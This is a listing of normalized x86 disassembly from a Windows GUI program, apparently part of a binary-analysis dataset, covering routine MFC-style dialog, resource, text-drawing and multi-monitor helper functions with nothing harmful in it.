mov [ esp + 0x4c ] 0xf0
mov [ esp + 0x50 ] rw-data
call ebp
call sub_4272f7
mov eax [ eax + 0x4 ]
push edi
push rw-data
push rw-data
mov ecx eax
call sub_426df1
mov [ esi + 0x98 ] eax
call sub_4272f7
mov eax [ eax + 0x4 ]
push edi
push rw-data
push rw-data
mov ecx eax
call sub_426df1
mov ebx eax
call sub_4272f7
mov eax [ eax + 0x4 ]
push edi
push rw-data
lea edx [ esp + 0x34 ]
push rw-data
push edx
mov ecx eax
call sub_426e5d
push eax
lea ecx [ esp + 0x24 ]
mov [ esp + 0x88 ] 0x4
call sub_4225b1
lea ecx [ esp + 0x2c ]
mov [ esp + 0x84 ] 0x3
call sub_422478
call sub_4272f7
mov eax [ eax + 0x4 ]
push edi
push rw-data
lea ecx [ esp + 0x34 ]
push rw-data
push ecx
mov ecx eax
call sub_426e5d
push eax
lea ecx [ esp + 0x20 ]
mov [ esp + 0x88 ] 0x5
call sub_4225b1
mov [ esp + 0x84 ] 0x3
lea ecx [ esp + 0x2c ]
call sub_422478
test ebx ebx
jle r-xdata
call sub_4272f7
mov eax [ eax + 0x4 ]
push 0x0
push rw-data
push rw-data
mov ecx eax
call sub_426df1
test eax eax
mov [ esi + 0x9c ] eax
je r-xdata
mov edx [ esp + 0x20 ]
mov al [ edi + edx ]
mov [ esp + 0x30 ] al
mov ecx [ esp + 0x30 ]
push ecx
lea ecx [ esp + 0x18 ]
call sub_41d726
push 0x1
push 0x35
lea ecx [ esp + 0x2c ]
call sub_41d6f2
mov edx [ esp + 0x24 ]
mov eax [ esp + 0x14 ]
push edx
push eax
call sub_41051e
add esp 0x8
lea ecx [ esp + 0x24 ]
test eax eax
sete [ esp + 0x13 ]
call sub_422478
mov al [ esp + 0x13 ]
test al al
je r-xdata
push 0x0
push 0x428
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x0
push 0x413
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x0
push 0x401
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x0
push 0x1
push 0x428
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x1
push 0x413
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x1
push 0x401
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x1
jmp r-xdata
push 0x1
push 0x38
lea ecx [ esp + 0x30 ]
call sub_41d6f2
mov ecx [ esp + 0x28 ]
mov edx [ esp + 0x14 ]
push ecx
push edx
call sub_41051e
add esp 0x8
lea ecx [ esp + 0x28 ]
test eax eax
sete [ esp + 0x13 ]
call sub_422478
mov al [ esp + 0x13 ]
test al al
je r-xdata
push rw-data
lea ecx [ esp + 0x18 ]
call sub_422601
push 0x425
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x0
mov ecx esi
call sub_421060
lea ecx [ esp + 0x14 ]
mov [ esp + 0x84 ] 0x2
call sub_422478
lea ecx [ esp + 0x18 ]
mov [ esp + 0x84 ] 0x1
call sub_422478
lea ecx [ esp + 0x1c ]
mov [ esp + 0x84 ] 0x0
call sub_422478
lea ecx [ esp + 0x20 ]
mov [ esp + 0x84 ] 0xffffffff
call sub_422478
mov ecx [ esp + 0x7c ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x78
retn
push 0x1
push 0x31
lea ecx [ esp + 0x34 ]
call sub_41d6f2
mov eax [ esp + 0x2c ]
mov ecx [ esp + 0x14 ]
push eax
push ecx
call sub_41051e
add esp 0x8
lea ecx [ esp + 0x2c ]
test eax eax
sete [ esp + 0x13 ]
call sub_422478
mov al [ esp + 0x13 ]
test al al
je r-xdata
push rw-data
lea ecx [ esp + 0x18 ]
call sub_422601
mov edx [ esp + 0x1c ]
mov ecx [ esp + 0x14 ]
movsx eax [ edi + edx ]
push eax
push ecx
lea edx [ esp + 0x20 ]
push rw-data
push edx
call sub_41dba7
mov eax [ esi + 0x78 ]
add esp 0x10
push 0x0
push 0x0
push 0x1004
push eax
call ebp
mov ecx [ esp + 0x18 ]
mov [ esp + 0x58 ] eax
mov eax [ ecx - 0x8 ]
lea ecx [ esp + 0x18 ]
push eax
call sub_422745
lea edx [ esp + 0x54 ]
mov [ esp + 0x68 ] eax
mov eax [ esi + 0x78 ]
push edx
push 0x0
push 0x1007
push eax
call ebp
inc edi
cmp edi ebx
jl r-xdata
push rw-data
lea ecx [ esp + 0x18 ]
call sub_422601
sub_408370
push esi
mov esi ecx
push 0x1
call sub_421060
mov eax [ esi + 0x9c ]
test eax eax
je r-xdata
push 0x0
push 0x428
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x0
push 0x413
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x0
push 0x401
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x0
push 0x1
push 0x428
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x1
push 0x413
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x1
push 0x401
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x1
jmp r-xdata
push 0x425
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
pop esi
retn
sub_408420
push 0xffffffff
push sub_42a9f1
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push esi
push edi
mov esi ecx
push eax
push 0xa0
mov [ esp + 0x10 ] esi
call sub_41ea14
lea edi [ esi + 0x5c ]
mov [ esp + 0x14 ] 0x0
mov ecx edi
call sub_41efc6
mov [ edi ] r--data
mov edx [ rw-data ]
lea ecx [ esi + 0x98 ]
mov [ ecx ] edx
push rw-data
mov [ esp + 0x18 ] 0x2
mov [ esi ] r--data
call sub_422601
mov ecx [ esp + 0xc ]
mov [ esi + 0x9c ] 0x0
mov [ esi + 0xa0 ] 0x0
mov eax esi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_4084e0
push esi
mov esi ecx
push edi
mov edi [ esp + 0xc ]
lea eax [ esi + 0x5c ]
push eax
push 0x434
push edi
call sub_425678
lea ecx [ esi + 0x9c ]
push ecx
push 0x413
push edi
call sub_4255a5
add esi 0xa0
push esi
push 0x433
push edi
call sub_425626
pop edi
pop esi
retn 0x4
sub_408530
push esi
mov esi ecx
push 0x1
call sub_421060
mov eax [ esi + 0x9c ]
cmp eax 0xa
jl r-xdata
mov eax [ esi + 0xa0 ]
test eax eax
je r-xdata
cmp eax 0x3e8
jle r-xdata
push edi
call sub_4272f7
mov ecx [ esi + 0x9c ]
mov eax [ eax + 0x4 ]
push ecx
push rw-data
push rw-data
mov ecx eax
call sub_425a5f
call sub_4272f7
mov edx [ esi + 0xa0 ]
mov eax [ eax + 0x4 ]
push edx
push rw-data
push rw-data
mov ecx eax
call sub_425a5f
mov eax [ esi + 0x78 ]
push 0x0
push 0x0
push 0x147
push eax
call [ SendMessageA@IAT ]
mov edi eax
cmp edi 0x1a
jge r-xdata
push 0x0
push rw-data
push rw-data
mov ecx esi
call sub_420904
pop esi
retn
add edi 0x27
add edi 0x61
jmp r-xdata
call sub_4272f7
mov eax [ eax + 0x4 ]
push edi
push rw-data
push rw-data
mov ecx eax
call sub_425a5f
mov ecx esi
call sub_41edb6
pop edi
pop esi
retn
sub_408600
push esi
mov esi ecx
call sub_41ed51
call sub_4272f7
mov eax [ eax + 0x4 ]
push 0x0
push rw-data
push rw-data
mov ecx eax
call sub_426df1
mov [ esi + 0xa0 ] eax
call sub_4272f7
mov eax [ eax + 0x4 ]
push 0x0
push rw-data
push rw-data
mov ecx eax
call sub_426df1
mov [ esi + 0x9c ] eax
call sub_4272f7
mov eax [ eax + 0x4 ]
push 0x0
push rw-data
push rw-data
mov ecx eax
call sub_426df1
cmp eax 0x61
jl r-xdata
sub eax 0x27
sub eax 0x61
jmp r-xdata
push 0x0
push 0x413
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x0
push 0x1
push 0x413
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x1
jmp r-xdata
push 0x0
push eax
mov eax [ esi + 0x78 ]
push 0x14e
push eax
call [ SendMessageA@IAT ]
mov eax [ esi + 0xa0 ]
test eax eax
je r-xdata
push 0x434
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x0
mov ecx esi
call sub_421060
mov eax 0x1
pop esi
retn
sub_4086f0
push esi
mov esi ecx
push 0x1
call sub_421060
mov eax [ esi + 0xa0 ]
test eax eax
je r-xdata
push 0x0
push 0x413
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x0
push 0x1
push 0x413
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x1
jmp r-xdata
push 0x434
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
pop esi
retn
sub_408774
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
je r-xdata
push r--data
call [ GetModuleHandleA@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
xor eax eax
cmp [ rw-data ] ebx
setne al
jmp r-xdata
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] 0x1
xor eax eax
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
pop edi
pop esi
pop ebx
retn
push r--data
push edi
call esi
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
push r--data
push edi
call esi
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
push r--data
push edi
call esi
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
push r--data
push edi
call esi
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
push r--data
push edi
call esi
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
push 0x1
pop eax
mov [ rw-data ] eax
jmp r-xdata
sub_40884c
push esi
push edi
call sub_408774
test eax eax
je r-xdata
test [ esp + 0x10 ] 0x3
jne r-xdata
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call [ rw-data ]
jmp r-xdata
mov eax 0x12340042
mov esi [ esp + 0xc ]
xor eax eax
cmp [ esi + 0x8 ] eax
jle r-xdata
pop edi
pop esi
retn 0x8
xor eax eax
jmp r-xdata
cmp [ esi + 0xc ] eax
jle r-xdata
mov edi [ GetSystemMetrics@IAT ]
push eax
call edi
cmp [ esi ] eax
jge r-xdata
push 0x1
call edi
cmp [ esi + 0x4 ] eax
jl r-xdata
sub_4088a2
push ebp
mov ebp esp
sub esp 0x2c
call sub_408774
test eax eax
je r-xdata
test [ ebp + 0xc ] 0x3
je r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ rw-data ]
jmp r-xdata
push [ ebp + 0x8 ]
call [ IsIconic@IAT ]
test eax eax
je r-xdata
mov eax 0x12340042
jmp r-xdata
leave
retn 0x8
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0x8 ]
call [ GetWindowRect@IAT ]
lea eax [ ebp - 0x2c ]
push eax
push [ ebp + 0x8 ]
call [ GetWindowPlacement@IAT ]
jmp r-xdata
xor eax eax
push [ ebp + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call sub_40884c
jmp r-xdata
test eax eax
je r-xdata
sub_40890d
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
call sub_408774
test eax eax
je r-xdata
cmp [ ebp + 0x8 ] 0x12340042
jne r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ rw-data ]
jmp r-xdata
xor eax eax
mov ebx [ ebp + 0xc ]
xor esi esi
cmp ebx esi
je r-xdata
pop esi
pop ebx
leave
retn 0x8
cmp [ ebx ] 0x28
jb r-xdata
lea eax [ ebp - 0x10 ]
push esi
push eax
push esi
push 0x30
call [ SystemParametersInfoA@IAT ]
test eax eax
je r-xdata
push edi
mov [ ebx + 0x4 ] esi
mov [ ebx + 0x8 ] esi
push esi
mov esi [ GetSystemMetrics@IAT ]
call esi
push 0x1
mov [ ebx + 0xc ] eax
call esi
lea edi [ ebx + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ ebx ] 0x48
push 0x1
movsd [ edi ] [ esi ]
pop esi
mov [ ebx + 0x10 ] eax
mov [ ebx + 0x24 ] esi
pop edi
jb r-xdata
mov eax esi
jmp r-xdata
add ebx 0x28
push r--data
push ebx
call [ lstrcpyA@IAT ]
sub_408aab
push ebp
mov ebp esp
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ecx + 0x4 ]
call [ ExtTextOutA@IAT ]
pop ebp
retn 0x1c
sub_408ad0
push ebp
mov ebp esp
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ecx + 0x4 ]
call [ TabbedTextOutA@IAT ]
mov ecx [ ebp + 0x8 ]
movsx edx ax
shr eax 0x10
movsx eax ax
mov [ ecx + 0x4 ] eax
mov [ ecx ] edx
mov eax ecx
pop ebp
retn 0x20
sub_408b24
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
push [ ecx + 0x4 ]
call [ GrayStringA@IAT ]
pop ebp
retn 0x20
mov eax [ eax + 0x4 ]
sub_408bbd
mov ecx [ esp + 0x4 ]
xor edx edx
push ebx
push esi
cmp [ ecx + 0x2 ] 0xffff
mov ebx [ ecx ]
sete dl
test edx edx
je r-xdata
lea eax [ ecx + 0x12 ]
mov ebx [ ecx + 0xc ]
lea eax [ ecx + 0x1a ]
jmp r-xdata
add eax esi
test cx cx
je r-xdata
add eax 0x4
mov cx [ eax ]
push 0x2
cmp cx 0xffff
pop esi
jne r-xdata
mov cx [ eax ]
cmp cx 0xffff
jne r-xdata
mov cx [ eax ]
jmp r-xdata
add eax esi
test cx cx
je r-xdata
add eax 0x4
jmp r-xdata
mov cx [ eax ]
add eax esi
test cx cx
jne r-xdata
mov cx [ eax ]
jmp r-xdata
test bl 0x40
je r-xdata
add eax 0x3
pop esi
and al 0xfc
pop ebx
retn 0x4
neg edx
sbb edx edx
and edx esi
inc edx
lea eax [ eax + edx * 2 ]
mov cx [ eax ]
add eax esi
test cx cx
jne r-xdata
sub_408c43
cmp [ esp + 0x8 ] 0x0
mov eax [ esp + 0x4 ]
je r-xdata
add eax 0x12
add eax 0x18
jmp r-xdata
add eax edx
test cx cx
je r-xdata
add eax 0x4
mov cx [ eax ]
push 0x2
cmp cx 0xffff
pop edx
jne r-xdata
mov cx [ eax ]
cmp cx 0xffff
jne r-xdata
mov cx [ eax ]
jmp r-xdata
add eax edx
test cx cx
je r-xdata
add eax 0x4
movzx ecx [ eax ]
lea eax [ ecx + eax + 0x5 ]
and al 0xfc
retn 0x8
mov cx [ eax ]
jmp r-xdata
sub_408caf
mov eax sub_42ad41
call sub_410a78
push ecx
push 0x54
call sub_4221b9
pop ecx
mov ecx eax
mov [ ebp - 0x10 ] ecx
xor eax eax
cmp ecx eax
mov [ ebp - 0x4 ] eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn 0x4
push [ ebp + 0x8 ]
call sub_409a37
sub_408ce6
mov eax sub_42ad55
call sub_410a78
push ecx
push 0xdc
call sub_4221b9
pop ecx
mov ecx eax
mov [ ebp - 0x10 ] ecx
xor eax eax
cmp ecx eax
mov [ ebp - 0x4 ] eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn 0x4
push [ ebp + 0x8 ]
call sub_40a69e
sub_408d20
push ebx
push esi
push edi
mov edi [ esp + 0x14 ]
mov ebx ecx
cmp [ edi + 0x2 ] 0xffff
lea eax [ edi + 0x10 ]
je r-xdata
movzx eax [ eax ]
lea eax [ eax * 4 + 0x4 ]
push eax
call sub_410b8c
mov esi [ esp + 0x14 ]
pop ecx
test eax eax
mov [ esi + 0x4 ] eax
je r-xdata
lea eax [ edi + 0x8 ]
pop edi
pop esi
pop ebx
retn 0x8
mov edx [ ebx ]
push eax
push edi
mov ecx ebx
call [ edx + 0x18 ]
test eax eax
mov [ esi ] eax
jne r-xdata
mov eax edi
sub_408d6a
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi ]
test eax eax
je r-xdata
mov esi [ esi + 0x4 ]
test esi esi
je r-xdata
push eax
call [ GlobalFree@IAT ]
pop esi
retn 0x4
push esi
call sub_410cc6
pop ecx
sub_408d8e
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_408bbd
mov ebx eax
mov ax [ esi + 0x2 ]
mov [ ebp - 0x10 ] ebx
sub ebx esi
xor ecx ecx
cmp ax 0xffff
sete cl
cmp ax 0xffff
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
lea eax [ esi + 0x10 ]
je r-xdata
movzx eax [ eax ]
and [ ebp - 0xc ] 0x0
mov esi [ ebp - 0x10 ]
test eax eax
mov [ ebp - 0x14 ] eax
jle r-xdata
lea eax [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
or [ eax ] 0xffffffff
xor eax eax
jmp r-xdata
mov edi eax
pop edi
pop esi
pop ebx
leave
retn 0x8
cmp [ ecx ] 0x7b
jne r-xdata
lea ecx [ esi + 0x12 ]
mov ecx eax
sub ecx esi
add [ ebp - 0x8 ] ecx
mov [ ebp - 0xc ] 0x1
jmp r-xdata
push [ ebp - 0x4 ]
push esi
call sub_408c43
cmp [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0x18 ]
jne r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
dec edi
mov esi eax
jne r-xdata
push [ ebp - 0x8 ]
push 0x0
call [ GlobalAlloc@IAT ]
push ebx
mov esi eax
push [ ebp + 0x8 ]
mov edi esi
push esi
call sub_410ff0
add esp 0xc
add esi ebx
cmp [ edi + 0x2 ] 0xffff
mov [ ebp - 0x8 ] esi
lea eax [ edi + 0x10 ]
je r-xdata
and [ eax ] 0x0
mov eax [ ebp + 0xc ]
mov ebx [ ebp - 0x10 ]
mov [ ebp + 0x8 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
lea eax [ edi + 0x8 ]
cmp [ eax ] 0x7b
jne r-xdata
lea eax [ ebx + 0x12 ]
sub esi ebx
push esi
push ebx
push [ ebp - 0x8 ]
call sub_410ff0
add [ ebp - 0x8 ] esi
add esp 0xc
cmp [ edi + 0x2 ] 0xffff
lea eax [ edi + 0x10 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
jmp r-xdata
inc [ eax ]
mov eax [ ebp + 0x8 ]
and [ eax ] 0x0
lea eax [ edi + 0x8 ]
add [ ebp + 0x8 ] 0x4
dec [ ebp - 0x10 ]
mov ebx [ ebp - 0xc ]
jne r-xdata
push [ ebp - 0x4 ]
push ebx
call sub_408c43
cmp [ ebp - 0x4 ] 0x0
mov esi eax
mov [ ebp - 0xc ] esi
lea eax [ ebx + 0x18 ]
jne r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x14 ]
or [ eax + ecx * 4 ] 0xffffffff
mov eax edi
sub_408ecd
push ebx
push esi
push edi
xor edi edi
cmp [ esp + 0x14 ] edi
mov ebx ecx
je r-xdata
push 0x1
test edi edi
pop eax
je r-xdata
call sub_4272f7
mov esi [ eax + 0xc ]
push 0xf0
push [ esp + 0x18 ]
push esi
call [ FindResourceA@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn 0xc
push [ esp + 0x18 ]
mov eax [ ebx ]
mov ecx ebx
push edi
push [ esp + 0x18 ]
call [ eax + 0x1c ]
push eax
push esi
call [ LoadResource@IAT ]
test eax eax
je r-xdata
push eax
call [ LockResource@IAT ]
mov edi eax
sub_408f28
push ebp
mov ebp esp
sub esp 0x1c
mov [ ebp - 0x14 ] ecx
push ebx
mov ecx [ ebp + 0x10 ]
xor ebx ebx
mov eax [ ecx ]
cmp eax ebx
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
cmp esi ebx
push edi
jne r-xdata
push 0x1
pop eax
jmp r-xdata
mov edx [ esi + 0x1c ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x8 ] ebx
jmp r-xdata
pop ebx
leave
retn 0xc
mov ecx [ esi + 0x34 ]
cmp ecx ebx
je r-xdata
mov ecx [ ecx + 0x4 ]
mov [ ebp + 0xc ] ebx
mov [ ebp - 0x18 ] ecx
mov [ ebp + 0x10 ] ebx
jmp r-xdata
mov edi [ ebp + 0xc ]
xor edx edx
cmp [ eax + 0x2 ] 0xffff
mov [ ebp - 0x4 ] 0x1
sete dl
cmp edi ebx
mov [ ebp - 0xc ] edx
je r-xdata
mov ecx [ ebp - 0x14 ]
push esi
call sub_409083
push ebx
call sub_40a0bc
cmp [ edi ] bx
je r-xdata
cmp [ ebp - 0x4 ] ebx
je r-xdata
inc edi
inc edi
mov ax [ edi ]
inc edi
inc edi
mov [ ebp - 0x1c ] eax
mov edx [ edi ]
add edi 0x4
cmp ax 0x376
mov [ ebp - 0x10 ] edx
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
mov esi [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov esi [ ecx + edx * 4 ]
inc edx
cmp esi ebx
mov [ ebp + 0xc ] edx
jne r-xdata
cmp ax 0x37a
je r-xdata
cmp esi 0xffffffff
je r-xdata
lea ebx [ ecx + edx * 4 ]
cmp ax 0x377
je r-xdata
and [ ebp - 0x4 ] 0x0
push [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
push edi
push eax
push esi
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_40919e
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp ax 0x37b
je r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ebp - 0xc ] 0x0
je r-xdata
push 0x2
push [ ebp + 0x10 ]
push 0x5
push [ ebp - 0x8 ]
jmp r-xdata
cmp ax 0x378
jne r-xdata
push ebx
call [ GetParent@IAT ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
push [ esi ]
push ebx
call [ SetWindowContextHelpId@IAT ]
cmp esi 0xffffffff
je r-xdata
mov eax [ ebp - 0x1c ]
call [ GetWindow@IAT ]
mov esi [ ebx ]
inc [ ebp + 0xc ]
add ebx 0x4
mov [ ebp + 0x10 ] eax
test esi esi
je r-xdata
add edi [ ebp - 0x10 ]
xor ebx ebx
cmp [ ebp - 0x4 ] ebx
jne r-xdata
mov [ ebp + 0x10 ] ebx
jmp r-xdata
sub_409083
push ebp
mov ebp esp
push ecx
push ecx
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x34 ]
test eax eax
je r-xdata
pop edi
leave
retn 0x4
mov eax [ eax + 0x2c ]
neg eax
sbb eax eax
test eax eax
mov [ ebp - 0x4 ] eax
je r-xdata
mov eax [ edi + 0x34 ]
mov eax [ eax + 0x2c ]
neg eax
sbb eax eax
test eax eax
mov [ ebp - 0x4 ] eax
je r-xdata
push esi
mov ecx [ edi + 0x34 ]
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
add ecx 0x20
call sub_41e5bb
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x88 ]
test ecx ecx
je r-xdata
mov eax [ ebp + 0x8 ]
mov ax [ eax + 0x90 ]
test ax ax
je r-xdata
push [ ebp + 0x8 ]
mov ecx esi
call sub_40eccd
mov ax [ esi + 0x4 ]
test ax ax
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ecx ]
call [ eax + 0xc ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
movzx eax ax
push eax
mov ecx edi
call sub_4219cc
mov esi eax
mov ecx [ esi + 0x38 ]
mov eax [ ecx ]
call [ eax + 0xb0 ]
mov ecx [ ebp + 0x8 ]
mov eax [ esi + 0x38 ]
push 0x1
mov [ ecx + 0x90 ] eax
mov eax [ esi + 0x38 ]
push [ ebp + 0x8 ]
mov ecx [ eax + 0x88 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8c ]
call sub_40ecea
mov esi eax
jmp r-xdata
movzx eax ax
push eax
mov ecx edi
call sub_4219cc
push [ eax + 0x38 ]
mov ecx esi
call sub_40ecd6
mov ecx [ edi + 0x34 ]
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
add ecx 0x20
call sub_41e5bb
mov eax [ ebp + 0x8 ]
mov esi [ eax + 0x8c ]
pop esi
test esi esi
je r-xdata
sub_40919e
mov eax sub_42ad7d
call sub_410a78
sub esp 0x80
push ebx
push edi
mov edi [ ebp + 0x14 ]
xor ebx ebx
cmp [ ebp + 0x10 ] ebx
lea eax [ edi + 0x12 ]
mov [ ebp - 0x18 ] eax
je r-xdata
movsx edx [ edi + 0xa ]
movsx eax [ edi + 0xe ]
movsx ecx [ edi + 0xc ]
add eax edx
push esi
movsx esi [ edi + 0x8 ]
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
add ecx esi
mov [ ebp - 0x40 ] esi
push [ eax + 0x1c ]
mov [ ebp - 0x3c ] edx
mov [ ebp - 0x38 ] ecx
call [ MapDialogRect@IAT ]
cmp [ ebp + 0x20 ] 0x4
mov esi [ ebp + 0x1c ]
mov [ ebp + 0x10 ] ebx
jb r-xdata
mov edx [ edi + 0x8 ]
mov ax [ eax ]
mov [ ebp - 0x64 ] edx
mov edx [ edi + 0x4 ]
mov [ ebp - 0x60 ] edx
mov dx [ edi + 0xc ]
mov [ ebp - 0x5c ] dx
mov dx [ edi + 0xe ]
mov ecx edi
mov [ ebp - 0x5a ] dx
mov dx [ edi + 0x10 ]
mov [ ebp - 0x56 ] ax
mov ax [ edi + 0x14 ]
add ecx 0x18
mov [ ebp - 0x58 ] dx
mov [ ebp - 0x54 ] ax
lea edi [ ebp - 0x64 ]
mov [ ebp - 0x18 ] ecx
mov eax [ rw-data ]
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] eax
cmp [ ebp + 0x18 ] 0x37a
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x24 ] ebx
je r-xdata
mov ebx [ esi ]
sub [ ebp + 0x20 ] 0x4
add esi 0x4
test ebx ebx
jbe r-xdata
mov eax [ esi ]
add esi 0xc
mov [ ebp - 0x2c ] eax
lea ecx [ eax - 0xc ]
cmp ecx ebx
mov [ ebp + 0x1c ] ecx
jbe r-xdata
cmp [ ebp + 0x18 ] 0x37b
jne r-xdata
xor ebx ebx
push ebx
push esi
call [ SysAllocStringLen@IAT ]
add ebx ebx
mov [ ebp + 0x10 ] eax
add esi ebx
sub [ ebp + 0x20 ] ebx
sub [ ebp + 0x20 ] eax
add [ ebp + 0x18 ] 0xfffc
mov eax [ esi ]
mov bx [ esi + 0x4 ]
sub [ ebp + 0x1c ] 0x6
add esi 0x4
inc esi
mov [ ebp - 0x28 ] eax
inc esi
cmp eax 0x80010001
jne r-xdata
mov eax [ ebp - 0x18 ]
lea ecx [ ebp - 0x50 ]
push ecx
push eax
cmp [ eax ] 0x7b
jne r-xdata
call [ CLSIDFromProgID@IAT ]
call [ CLSIDFromString@IAT ]
jmp r-xdata
push 0x1c
call sub_4221b9
pop ecx
mov [ ebp - 0x30 ] eax
test eax eax
mov [ ebp - 0x4 ] 0x1
je r-xdata
mov eax [ esi ]
add esi 0x4
mov [ ebp - 0x20 ] eax
lea ecx [ ebp - 0x10 ]
mov eax [ esi ]
add esi 0xc
push esi
mov [ ebp - 0x24 ] eax
call sub_422601
mov eax [ ebp - 0x10 ]
push 0xffffffef
pop ecx
mov [ ebp - 0x1c ] ebx
mov eax [ eax - 0x8 ]
sub ecx eax
add [ ebp + 0x1c ] ecx
lea esi [ esi + eax + 0x1 ]
jmp r-xdata
cmp [ ebp + 0x10 ] ebx
pop esi
je r-xdata
mov ecx [ ebp + 0x8 ]
call sub_409982
test eax eax
je r-xdata
push ebx
lea ecx [ ebp - 0x8c ]
push [ ebp + 0x20 ]
mov [ ebp + 0x1c ] eax
push esi
call sub_425db5
mov si [ ebp + 0x18 ]
lea eax [ ebp - 0x8c ]
sub si 0x378
mov [ ebp - 0x4 ] 0x2
neg si
sbb esi esi
mov [ ebp + 0x14 ] ebx
and esi eax
cmp [ ebp + 0x1c ] ebx
jl r-xdata
xor eax eax
push ebx
mov ecx eax
push [ ebp - 0x28 ]
push [ ebp - 0x14 ]
call sub_40eca7
jmp r-xdata
cmp [ ebp + 0x1c ] 0x0
ja r-xdata
mov eax [ ebp + 0x14 ]
cmp eax ebx
